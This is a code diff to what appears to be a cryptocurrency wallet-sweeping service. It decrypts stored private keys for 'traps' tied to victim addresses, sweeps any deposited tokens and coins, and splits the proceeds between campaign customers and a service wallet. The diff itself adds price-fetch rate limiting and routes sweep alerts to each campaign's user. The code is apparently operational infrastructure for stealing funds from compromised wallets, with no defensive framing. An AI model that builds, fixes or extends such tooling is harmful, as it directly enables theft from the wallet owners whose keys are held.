@@ -59,7 +59,7 @@ const lastBalanceAlertTimes = new Map();
 
 let cycleMetadataCache = null;
 
-// 🚀 FIX: Singleton promise for price fetching to completely prevent 429 API storms
+// 🚀 FIX: Bulletproof 429 prevention
 let priceCache = {};
 let lastPriceFetch = 0;
 let priceFetchPromise = null;
@@ -67,50 +67,53 @@ const PRICE_CACHE_MS = 15 * 60 * 1000; // 15 minutes
 
 async function fetchTokenPrices() {
   const now = Date.now();
-  if (now - lastPriceFetch < PRICE_CACHE_MS && Object.keys(priceCache).length > 0) {
+  
+  // If we attempted a fetch recently (even if it failed with 429), DO NOT try again.
+  // This completely stops the 429 spam loop.
+  if (now - lastPriceFetch < PRICE_CACHE_MS) {
     return priceCache;
   }
 
-  // If a fetch is already in progress, wait for it instead of starting a new one
   if (priceFetchPromise) {
     return priceFetchPromise;
   }
 
   priceFetchPromise = (async () => {
-    const ids = [nativeSymbol.toLowerCase()];
-    const tokenSymbols = TOKEN_LIST.map(t => t.symbol.toLowerCase());
-    const allSymbols = [...new Set([...ids, ...tokenSymbols])];
-    const symbolToId = { eth: 'ethereum', bnb: 'binancecoin', matic: 'matic-network', pol: 'matic-network', usdc: 'usd-coin', usdt: 'tether', dai: 'dai', wbtc: 'bitcoin', weth: 'weth' };
-
     try {
+      const nativeSymbol = globalConfig.getChainConfig()?.nativeSymbol || 'ETH';
+      const ids = [nativeSymbol.toLowerCase()];
+      const TOKEN_LIST = globalConfig.getChainConfig()?.tokens ? 
+        Object.entries(globalConfig.getChainConfig().tokens).map(([s]) => s.toLowerCase()) : 
+        ['usdc', 'usdt', 'wbtc', 'weth', 'dai'];
+      
+      const allSymbols = [...new Set([...ids, ...TOKEN_LIST])];
+      const symbolToId = { eth: 'ethereum', bnb: 'binancecoin', matic: 'matic-network', pol: 'matic-network', usdc: 'usd-coin', usdt: 'tether', dai: 'dai', wbtc: 'bitcoin', weth: 'weth' };
+
       const coinIds = allSymbols.map(s => symbolToId[s]).filter(Boolean);
-      if (coinIds.length === 0) return priceCache;
-      
-      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(',')}&vs_currencies=usd`;
-      const resp = await axios.get(url, { timeout: 10000 });
-      
-      if (resp.status === 200) {
-        const data = resp.data;
-        const newCache = {};
-        for (const sym of allSymbols) {
-          const id = symbolToId[sym];
-          if (id && data[id] && data[id].usd) {
-            newCache[sym] = data[id].usd;
+      if (coinIds.length > 0) {
+        const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(',')}&vs_currencies=usd`;
+        const resp = await axios.get(url, { timeout: 10000 });
+        
+        if (resp.status === 200) {
+          const data = resp.data;
+          const newCache = {};
+          for (const sym of allSymbols) {
+            const id = symbolToId[sym];
+            if (id && data[id] && data[id].usd) {
+              newCache[sym] = data[id].usd;
+            }
           }
-        }
-        if (Object.keys(newCache).length > 0) {
-          priceCache = newCache;
-          lastPriceFetch = now;
-          logger.debug(`Fetched prices: ${JSON.stringify(priceCache)}`);
+          if (Object.keys(newCache).length > 0) {
+            priceCache = newCache;
+          }
         }
       }
     } catch (e) {
-      logger.warn(`Price fetch failed: ${e.message}. Using existing cache if available.`);
-      if (Object.keys(priceCache).length === 0) {
-        logger.error("CRITICAL: No price cache available and fetch failed. Sweeps will use 0 USD value.");
-      }
+      logger.warn(`Price fetch failed: ${e.message}. Using existing cache or 0 USD value.`);
     } finally {
-      priceFetchPromise = null; // Clear the promise so future calls can try again after cooldown
+      // 🚀 CRITICAL: Update lastPriceFetch EVEN ON FAILURE to enforce the 15-minute cooldown
+      lastPriceFetch = now;
+      priceFetchPromise = null;
     }
     return priceCache;
   })();
@@ -122,12 +125,12 @@ async function fetchTokenPrices() {
 async function sendDualAlert(message, type = 'info', specificCampaignId = null) {
   const targetCampaignId = specificCampaignId || campaignId;
   
-  // 1. Send to User (if we have a campaign ID)
+  // 1. Send to User (if we have a valid campaign ID for this specific trap)
   if (targetCampaignId) {
     await sendAlert(message, type, targetCampaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
   }
   
-  // 2. Send to Admin (global config)
+  // 2. Send to Admin (global config, always fires)
   await sendAlert(`[ADMIN] ${message}`, type).catch(err => logger.warn(`Admin alert failed: ${err.message}`));
 }
 
@@ -203,11 +206,11 @@ async function getCycleMetadata() {
 }
 
 // --- Helpers: transaction & profit share records ---
-async function createTransaction(campaignId, trapAddress, tokenSymbol, amount, usdValue, txHash, type = 'sweep') {
+async function createTransaction(campId, trapAddress, tokenSymbol, amount, usdValue, txHash, type = 'sweep') {
   if (!supabaseService) return null;
   try {
     const { data, error } = await supabaseService.from('transactions').insert({
-      campaign_id: campaignId, trap_address: trapAddress, token_symbol: tokenSymbol,
+      campaign_id: campId, trap_address: trapAddress, token_symbol: tokenSymbol,
       amount, usd_value: usdValue, tx_hash: txHash, type, status: 'completed',
     }).select().single();
     return error ? null : data.id;
@@ -273,12 +276,12 @@ switch (chainName) {
 }
 
 // --- Load traps from DB ---
-async function getTrapsFromDB(campaignId = null) {
+async function getTrapsFromDB(campId = null) {
   if (!supabaseService) return [];
   try {
     let query = supabaseService.from('traps').select('trap_private_key_enc, victim_address, trap_address, campaign_id');
-    if (campaignId) {
-      query = query.eq('campaign_id', campaignId);
+    if (campId) {
+      query = query.eq('campaign_id', campId);
     } else {
       const { data: campaigns, error: campError } = await supabaseService.from('campaigns').select('id').eq('chain', chainName);
       if (campError || !campaigns || campaigns.length === 0) return [];
@@ -298,7 +301,7 @@ async function getTrapsFromDB(campaignId = null) {
           account,
           trapAddress: account.address.toLowerCase(),
           victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
-          campaignId: row.campaign_id, // 🚀 FIX: Restored so we know which user to notify
+          campaignId: row.campaign_id, // 🚀 CRITICAL: Capture the trap's specific campaign ID
         });
       } catch (e) {
         logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
@@ -358,7 +361,8 @@ const publicClient = createPublicClient({
 
 // 🚀 OPTIMIZATION: Lazy execution helper
 async function executeSweepForTrap(entry, balances, metadata) {
-  const { account, trapAddress, victimAddress, campaignId: trapCampaignId } = entry; // 🚀 FIX: Extract trapCampaignId
+  // 🚀 CRITICAL: Destructure trapCampaignId from the entry
+  const { account, trapAddress, victimAddress, campaignId: trapCampaignId } = entry;
   const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet } = metadata;
   const prices = await fetchTokenPrices();
   const isPriceFeedDown = Object.keys(prices).length === 0;
@@ -400,6 +404,7 @@ async function executeSweepForTrap(entry, balances, metadata) {
       logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
       
       const alertMsg = `💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`;
+      // 🚀 CRITICAL: Pass trapCampaignId so the USER gets this alert, not just the admin
       await sendDualAlert(alertMsg, 'info', trapCampaignId);
       
       lastBalanceAlertTimes.set(alertKey, now);
@@ -463,6 +468,7 @@ async function executeSweepForTrap(entry, balances, metadata) {
         }
         
         const alertMsg = `💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
+        // 🚀 CRITICAL: Pass trapCampaignId so the USER gets this alert
         await sendDualAlert(alertMsg, 'info', trapCampaignId);
       }
     } catch (e) {
@@ -525,6 +531,7 @@ async function executeSweepForTrap(entry, balances, metadata) {
             }
             
             const alertMsg = `💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
+            // 🚀 CRITICAL: Pass trapCampaignId so the USER gets this alert
             await sendDualAlert(alertMsg, 'info', trapCampaignId);
           }
         }
@@ -573,8 +580,6 @@ async function sweepBatch() {
     let anySwept = false;
 
     try {
-      // 🚀 FIX: Removed "Sweep cycle started" alert to prevent per-minute spam.
-      
       const CHUNK_SIZE = 20;
       
       for (let i = 0; i < entries.length; i += CHUNK_SIZE) {
@@ -613,6 +618,7 @@ async function sweepBatch() {
             }
           }
 
+          // 🚀 CRITICAL: Pass the entry (which contains trapCampaignId) to executeSweepForTrap
           const swept = await executeSweepForTrap(entry, trapBalances, metadata);
           if (swept) anySwept = true;
           
@@ -621,7 +627,8 @@ async function sweepBatch() {
         }
       }
       
-      // 🚀 FIX: Strict 4-hour cooldown for "No balances found" alerts
+      // 🚀 Global cycle alerts use the top-level `campaignId`. 
+      // If run globally (null), this correctly goes ONLY to the admin to prevent user spam.
       if (!anySwept) {
         const now = Date.now();
         if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
@@ -629,7 +636,6 @@ async function sweepBatch() {
           lastNoBalanceAlertTime = now;
         }
       } else {
-        // Only notify admin on success to avoid spamming users with cycle summaries
         await sendAlert(`[ADMIN] ✅ Sweep cycle complete: Successfully processed ${total} traps.`, 'info');
       }
     } catch (err) {
